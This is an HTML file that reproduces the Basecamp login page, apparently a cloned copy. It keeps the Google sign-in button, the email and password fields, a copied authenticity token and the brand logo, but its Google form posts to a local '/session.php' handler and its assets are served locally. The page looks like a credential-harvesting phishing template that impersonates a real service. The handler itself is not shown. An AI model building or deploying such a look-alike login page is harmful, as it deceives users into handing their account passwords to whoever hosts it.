<!DOCTYPE html>
<html lang="en" class="" >
<head>
  <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
     <meta name="description" content="">
     <meta name="author" content="">
     <link rel="icon" href="../../favicon.ico">

     <link type="text/css" rel="stylesheet" href="src/css/foter_dev_images.css">
     <link type="text/css" rel="stylesheet" href="src/css/main.css">

     <link href="library/bootstrap/css/bootstrap.min.css" rel="stylesheet">
     <link href="src/css/main.css" rel="stylesheet">

</head>
<body>
  <body class="login bc3">


  <div class="brand-wrapper" data-state="username">
    <div class="balloon">
      <div class="hide--when-loading txt--left">

        <img width="98" height="78" class="img--sized push_half--bottom" src="images/camper-smile.svg" />


 <h3 class="flush--top push_half--bottom">Happy <time datetime="2018-03-21T07:28:23Z" data-local="time" data-format="%A">Day</time>!</h3>
        <h1>Log in to Basecamp</h1>


        <form data-behavior="google_login" onsubmit="Login.loginLoading()" action="/session.php" accept-charset="UTF-8" method="post">
          <input name="utf8" type="hidden" value="&#x2713;" />
          <input type="hidden" name="authenticity_token" value="auth" />

  <input type="hidden" name="remember_me" id="remember_me" value="true" />

          <input type="hidden" name="google_token" id="google_token" value="" data-behavior="google_token" />

          <button name="button" type="submit" class="action_button" data-behavior="google_login_button">Use my
            <img width="72" height="24" class="action_button__img" alt="Google" title="Google" src="https://launchpad-asset3.37signals.com/images/logos/google.svg"/> account</button>

  </form>

        <div class="break txt--center txt--subtle push--top push_half--bottom">
          <div class="break__content">Or, use my email address</div>
        </div>



        <form data-behavior="login_form" data-profile-url="/" action="/session" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="&#x2713;" /><input type="hidden" name="authenticity_token" value="5zL6VC4hZfR+sSxpi63j+IRjXkjoDm1pcA9//bSJhgk9BSEUkOo+l6yt1JgxOGepfRA/DQh8Ch7Bf9oNpj7JTQ==" />



  <input type="hidden" name="remember_me" id="remember_me" value="true" />

          <div class="field">
    <label class="field__label" for="username">Email or username</label>
    <input type="text" name="username" id="username" value="" autocomplete="on" autocorrect="off" autocapitalize="off" class="input--text" placeholder="e.g. xyz@gmail  .com" data-role="username" data-original-value="" />
  </div>

  <div class="push_half--bottom" style="display: none; margin-top: -13.6px;" data-role="unrecognized_notice_container">
    <small class="txt--red">We couldn&rsquo;t find that one. Want to try another?</small>
  </div>

  <div class="push_half--bottom" style="display: none; margin-top: -13.6px;" data-role="authenticates_with_google_notice_container">
    <small class="txt--red">Oops, you need to click the Google button up top ↑</small>
  </div>

  <div class="field" style="display: none;" data-role="password_container">
    <label class="field__label" for="password">Password</label>
    <input type="password" name="password" id="password" autocomplete="off" autocorrect="off" autocapitalize="off" class="input--text" />
  </div>

  <button name="button" type="button" class="action_button" data-role="next_button">Next</button>

  <input type="submit" name="commit" value="Log in" class="action_button" style="display: none;" disabled="disabled" data-role="login_button" data-disable-with="Log in" />

  </form>    </div>

      <h1 class="hide--unless-loading">Logging you in&hellip;</h1>
      <div class="loading hide--unless-loading" id="progressBar"></div>
    </div>

    <div class="footer">
      <strong>Help:</strong> <a href="/forgot_password">Reset your password</a>
    </div>
  </div>




















</body>
</html>
